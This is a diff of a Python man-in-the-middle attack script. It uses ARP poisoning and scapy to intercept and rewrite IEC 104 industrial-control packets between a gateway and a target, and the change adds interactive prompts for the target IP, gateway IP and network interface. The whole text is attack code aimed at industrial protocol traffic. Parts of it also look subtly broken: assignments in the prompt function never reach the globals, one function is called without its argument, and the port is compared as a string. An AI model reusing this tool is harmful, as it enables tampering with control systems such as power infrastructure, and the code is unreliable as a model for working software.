@@ -9,13 +9,20 @@ from scapy.layers.inet import TCP, IP
 from ARP_poisoning import *
 from iec104lib import *
 
-ip_router = ARP_poisoning.gateway_ip
-ip_target = ARP_poisoning.target_ip
-ip_attack = ARP_poisoning.attack_ip
-mac_router = ARP_poisoning().get_mac(ip_router)
-mac_target = ARP_poisoning().get_mac(ip_target)
+ip_gateway = ""
+ip_target = ""
+ip_attack = ""
+mac_router = ""
+mac_target = ""
 
-interface = "en0"
+interface = ""
+
+
+def set_parameters():
+    ip_target = input('Enter target IP address :')
+    ip_gateway = input('Enter gateway IP address :')
+    ip_attack = input('Enter target attack address :')
+    interface = input('Enter used interface :')
 
 
 def reconstructing_packet(chosen_packet):
@@ -58,7 +65,7 @@ def is_packet_containing_apci(packet):
 
 
 def is_104_packet_from_router(packet):
-    if is_packet_containing_apci() and (packet[IP].src == ip_router):
+    if is_packet_containing_apci() and (packet[IP].src == ip_gateway):
         return True
     else:
         return False
@@ -79,7 +86,7 @@ def is_packet_mesure_packet(packet):
 
 
 def mitm(chosen_packet):
-    if chosen_packet[Ether].src == mac_router and chosen_packet[IP].src == ip_router and chosen_packet[IP].dst == ip_target:
+    if chosen_packet[Ether].src == mac_router and chosen_packet[IP].src == ip_gateway and chosen_packet[IP].dst == ip_target:
         modify_packet_for_target(chosen_packet)
         if chosen_packet[TCP].dport == '2404':
             new_packet = reconstructing_packet(chosen_packet)
@@ -88,7 +95,7 @@ def mitm(chosen_packet):
 
         send(chosen_packet, verbose=False)
 
-    if chosen_packet[Ether].src == mac_target and chosen_packet[IP].src == ip_target and chosen_packet[IP].dst == ip_router:
+    if chosen_packet[Ether].src == mac_target and chosen_packet[IP].src == ip_target and chosen_packet[IP].dst == ip_gateway:
         modify_packet_for_router(chosen_packet)
         send(chosen_packet, verbose=False)
 
@@ -102,6 +109,11 @@ def loop_sleep():
 
 
 def main_sniff():
+    set_parameters()
+
+    mac_router = ARP_poisoning().get_mac(ip_gateway)
+    mac_target = ARP_poisoning().get_mac(ip_target)
+
     ARP_poisoning().stop_ip_forward()
     print("MitM with sniffing & IEC 104 packet modification until ctrl-c")
     sniff(prn=mitm, filter="ip")
